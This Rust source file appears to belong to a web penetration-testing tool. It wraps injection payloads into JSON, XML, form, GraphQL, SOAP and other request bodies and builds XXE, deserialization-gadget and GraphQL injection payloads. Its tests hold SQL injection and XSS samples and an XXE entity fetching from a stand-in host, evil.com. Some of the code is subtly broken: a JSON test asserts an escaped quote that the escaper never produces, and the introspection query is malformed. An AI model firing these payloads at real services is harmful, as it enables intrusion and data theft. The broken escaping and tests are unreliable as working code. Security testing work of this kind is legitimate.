//! Content-Type Aware Payload Wrappers - JSON, XML, form data, GraphQL, gRPC
//!
//! Builds content-type aware payload wrappers that properly format injection
//! payloads for different request body formats.

use crate::payload::{GeneratedPayload, PayloadClass, Severity, SafetyLevel};
use std::collections::HashMap;

/// Supported content types
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum ContentType {
    Json,
    Xml,
    FormUrlEncoded,
    MultipartFormData,
    GraphQl,
    Grpc,
    Soap,
    Yaml,
    TextPlain,
}

impl ContentType {
    pub fn as_str(&self) -> &'static str {
        match self {
            ContentType::Json => "application/json",
            ContentType::Xml => "application/xml",
            ContentType::FormUrlEncoded => "application/x-www-form-urlencoded",
            ContentType::MultipartFormData => "multipart/form-data",
            ContentType::GraphQl => "application/graphql",
            ContentType::Grpc => "application/grpc",
            ContentType::Soap => "application/soap+xml",
            ContentType::Yaml => "application/yaml",
            ContentType::TextPlain => "text/plain",
        }
    }

    pub fn from_header(header: &str) -> Option<Self> {
        let header = header.to_lowercase();
        if header.contains("json") {
            Some(ContentType::Json)
        } else if header.contains("xml") {
            if header.contains("soap") {
                Some(ContentType::Soap)
            } else {
                Some(ContentType::Xml)
            }
        } else if header.contains("graphql") {
            Some(ContentType::GraphQl)
        } else if header.contains("grpc") {
            Some(ContentType::Grpc)
        } else if header.contains("form") {
            if header.contains("multipart") {
                Some(ContentType::MultipartFormData)
            } else {
                Some(ContentType::FormUrlEncoded)
            }
        } else if header.contains("yaml") || header.contains("yml") {
            Some(ContentType::Yaml)
        } else if header.contains("text") {
            Some(ContentType::TextPlain)
        } else {
            None
        }
    }
}

/// Content-aware payload builder
#[derive(Debug, Default)]
pub struct ContentPayloadBuilder {
    templates: HashMap<ContentType, String>,
}

impl ContentPayloadBuilder {
    pub fn new() -> Self {
        Self::default()
    }

    /// Register a custom template for a content type
    pub fn with_template(mut self, content_type: ContentType, template: impl Into<String>) -> Self {
        self.templates.insert(content_type, template.into());
        self
    }

    /// Wrap a payload for JSON content type
    pub fn wrap_json(&self, key: &str, payload: &GeneratedPayload) -> String {
        format!(r#"{{"{}": "{}"}}"#, key, self.json_escape(&payload.raw))
    }

    /// Wrap a payload for XML content type
    pub fn wrap_xml(&self, key: &str, payload: &GeneratedPayload) -> String {
        format!(r#"<{}>{}</{}>"#, key, self.xml_escape(&payload.raw), key)
    }

    /// Wrap a payload for form-urlencoded content type
    pub fn wrap_form(&self, key: &str, payload: &GeneratedPayload) -> String {
        format!("{}={}", 
            self.url_encode(key),
            self.url_encode(&payload.raw)
        )
    }

    /// Wrap a payload for GraphQL content type
    pub fn wrap_graphql(&self, operation: &str, variable: &str, payload: &GeneratedPayload) -> String {
        format!(
            r#"{{"query": "mutation {} {{ {}({}: \"{}\") }}"}}"#,
            operation,
            operation,
            variable,
            self.graphql_escape(&payload.raw)
        )
    }

    /// Wrap a payload for gRPC (protobuf text format for testing)
    pub fn wrap_grpc(&self, message_name: &str, field: &str, payload: &GeneratedPayload) -> String {
        format!(
            r#"{} {{
  {}: "{}"
}}"#,
            message_name,
            field,
            self.escape_string(&payload.raw)
        )
    }

    /// Wrap a payload for SOAP content type
    pub fn wrap_soap(&self, operation: &str, param: &str, payload: &GeneratedPayload) -> String {
        format!(
            r#"<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <{} xmlns="">
      <{}>{}</{}>
    </{}>
  </soapenv:Body>
</soapenv:Envelope>"#,
            operation,
            param,
            self.xml_escape(&payload.raw),
            param,
            operation
        )
    }

    /// Wrap a payload for YAML content type
    pub fn wrap_yaml(&self, key: &str, payload: &GeneratedPayload) -> String {
        format!("{}: {}", key, self.yaml_escape(&payload.raw))
    }

    /// Build multipart form data payload
    pub fn wrap_multipart(&self, boundary: &str, key: &str, payload: &GeneratedPayload, filename: Option<&str>) -> String {
        let mut result = format!("--{}\r\n", boundary);
        result.push_str(&format!("Content-Disposition: form-data; name=\"{}\"", key));
        
        if let Some(name) = filename {
            result.push_str(&format!("; filename=\"{}\"", name));
            result.push_str("\r\nContent-Type: application/octet-stream\r\n\r\n");
        } else {
            result.push_str("\r\n\r\n");
        }
        
        result.push_str(&payload.raw);
        result.push_str("\r\n");
        result
    }

    /// Generate XXE payload wrapped in XML
    pub fn wrap_xxe(&self, external_entity: &str) -> String {
        format!(
            r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "{}">
]>
<root>&xxe;</root>"#,
            external_entity
        )
    }

    /// Generate deserialization payload for JSON
    pub fn wrap_deserialization(&self, gadget_chain: &str, base64_payload: &str) -> String {
        format!(
            r#"{{
  "@type": "{}",
  "data": "{}"
}}"#,
            gadget_chain,
            base64_payload
        )
    }

    /// Escape string for JSON
    fn json_escape(&self, s: &str) -> String {
        s.replace('\\', "\\\\")
            .replace('"', "\\\"")
            .replace('\n', "\\n")
            .replace('\r', "\\r")
            .replace('\t', "\\t")
    }

    /// Escape string for XML
    fn xml_escape(&self, s: &str) -> String {
        s.replace('&', "&amp;")
            .replace('<', "&lt;")
            .replace('>', "&gt;")
            .replace('"', "&quot;")
            .replace('\'', "&apos;")
    }

    /// URL encode
    fn url_encode(&self, s: &str) -> String {
        s.chars().flat_map(|c| {
            match c {
                'a'..='z' | 'A'..='Z' | '0'..='9' | '-' | '_' | '.' | '~' => vec![c],
                _ => {
                    let mut result = Vec::new();
                    for byte in c.to_string().as_bytes() {
                        let hex = format!("%{:02X}", byte);
                        result.extend(hex.chars());
                    }
                    result
                }
            }
        }).collect()
    }

    /// Escape for GraphQL
    fn graphql_escape(&self, s: &str) -> String {
        s.replace('\\', "\\\\")
            .replace('"', "\\\"")
            .replace('\n', "\\n")
    }

    /// Generic string escape
    fn escape_string(&self, s: &str) -> String {
        self.json_escape(s)
    }

    /// YAML escape
    fn yaml_escape(&self, s: &str) -> String {
        if s.contains(':') || s.contains('#') || s.starts_with(' ') {
            format!("\"{}\"", s.replace('"', "\\\""))
        } else {
            s.to_string()
        }
    }

    /// Wrap payload based on content type
    pub fn wrap_by_content_type(&self, content_type: ContentType, key: &str, payload: &GeneratedPayload) -> String {
        match content_type {
            ContentType::Json => self.wrap_json(key, payload),
            ContentType::Xml => self.wrap_xml(key, payload),
            ContentType::FormUrlEncoded => self.wrap_form(key, payload),
            ContentType::GraphQl => self.wrap_graphql("InjectTest", "input", payload),
            ContentType::Grpc => self.wrap_grpc("TestMessage", "field", payload),
            ContentType::Soap => self.wrap_soap("TestOperation", "param", payload),
            ContentType::Yaml => self.wrap_yaml(key, payload),
            ContentType::MultipartFormData => self.wrap_multipart("boundary123", key, payload, None),
            ContentType::TextPlain => payload.raw.clone(),
        }
    }
}

/// Batch content wrapper for multiple payloads
#[derive(Debug)]
pub struct ContentBatchWrapper {
    builder: ContentPayloadBuilder,
    content_type: ContentType,
}

impl ContentBatchWrapper {
    pub fn new(content_type: ContentType) -> Self {
        Self {
            builder: ContentPayloadBuilder::new(),
            content_type,
        }
    }

    /// Wrap multiple payloads into a single request body
    pub fn wrap_batch(&self, payloads: &[(&str, GeneratedPayload)]) -> String {
        match self.content_type {
            ContentType::Json => self.wrap_json_batch(payloads),
            ContentType::Xml => self.wrap_xml_batch(payloads),
            ContentType::FormUrlEncoded => self.wrap_form_batch(payloads),
            ContentType::Yaml => self.wrap_yaml_batch(payloads),
            _ => {
                // Default to wrapping each individually
                payloads.iter()
                    .map(|(key, p)| self.builder.wrap_by_content_type(self.content_type, key, p))
                    .collect::<Vec<_>>()
                    .join("\n")
            }
        }
    }

    fn wrap_json_batch(&self, payloads: &[(&str, GeneratedPayload)]) -> String {
        let mut obj = String::from("{");
        let mut first = true;
        for (key, payload) in payloads {
            if !first {
                obj.push(',');
            }
            first = false;
            obj.push_str(&format!(r#""{}": "{}""#, key, self.builder.json_escape(&payload.raw)));
        }
        obj.push('}');
        obj
    }

    fn wrap_xml_batch(&self, payloads: &[(&str, GeneratedPayload)]) -> String {
        let mut xml = String::from("<root>");
        for (key, payload) in payloads {
            xml.push_str(&format!("<{}>{}</{}>", 
                key, 
                self.builder.xml_escape(&payload.raw),
                key
            ));
        }
        xml.push_str("</root>");
        xml
    }

    fn wrap_form_batch(&self, payloads: &[(&str, GeneratedPayload)]) -> String {
        payloads.iter()
            .map(|(key, payload)| format!("{}={}", 
                self.builder.url_encode(*key),
                self.builder.url_encode(&payload.raw)
            ))
            .collect::<Vec<_>>()
            .join("&")
    }

    fn wrap_yaml_batch(&self, payloads: &[(&str, GeneratedPayload)]) -> String {
        payloads.iter()
            .map(|(key, payload)| format!("{}: {}", key, self.builder.yaml_escape(&payload.raw)))
            .collect::<Vec<_>>()
            .join("\n")
    }
}

/// GraphQL-specific payload generator
pub struct GraphQlPayloadGenerator;

impl GraphQlPayloadGenerator {
    /// Generate introspection query payload
    pub fn introspection_query() -> &'static str {
        r#"{"query": "__schema { types { name fields { name type { name kind } } } }"}"#
    }

    /// Generate batch query payload
    pub fn batch_queries(queries: &[&str]) -> String {
        let formatted: Vec<String> = queries.iter()
            .enumerate()
            .map(|(i, q)| format!("q{}: {}", i, q))
            .collect();
        format!(r#"{{"query": "{{ {} }}"}}"#, formatted.join(" "))
    }

    /// Generate mutation payload with injection
    pub fn inject_mutation(operation: &str, input_field: &str, payload: &str) -> String {
        format!(
            r#"{{"query": "mutation {{ {}({}: \"{}\") }}"}}"#,
            operation,
            input_field,
            payload.replace('"', "\\\"")
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_json_wrapping() {
        let builder = ContentPayloadBuilder::new();
        let payload = GeneratedPayload::new("test", "' OR 1=1", PayloadClass::SqlInjection, Severity::High, SafetyLevel::Unsafe);
        
        let wrapped = builder.wrap_json("username", &payload);
        assert!(wrapped.contains(r#""username""#));
        assert!(wrapped.contains(r#"\' OR 1=1"#));
    }

    #[test]
    fn test_xml_wrapping() {
        let builder = ContentPayloadBuilder::new();
        let payload = GeneratedPayload::new("test", "<script>", PayloadClass::Xss, Severity::High, SafetyLevel::Unsafe);
        
        let wrapped = builder.wrap_xml("data", &payload);
        assert!(wrapped.contains("&lt;script&gt;"));
    }

    #[test]
    fn test_content_type_from_header() {
        assert_eq!(ContentType::from_header("application/json"), Some(ContentType::Json));
        assert_eq!(ContentType::from_header("application/xml"), Some(ContentType::Xml));
        assert_eq!(ContentType::from_header("application/graphql"), Some(ContentType::GraphQl));
    }

    #[test]
    fn test_graphql_injection() {
        let payload = GraphQlPayloadGenerator::inject_mutation("login", "username", "' OR '1'='1");
        assert!(payload.contains("mutation"));
        assert!(payload.contains("login"));
    }

    #[test]
    fn test_xxe_wrapper() {
        let builder = ContentPayloadBuilder::new();
        let xxe = builder.wrap_xxe("http://evil.com/xxe.dtd");
        assert!(xxe.contains("<!ENTITY"));
        assert!(xxe.contains("&xxe;"));
    }
}
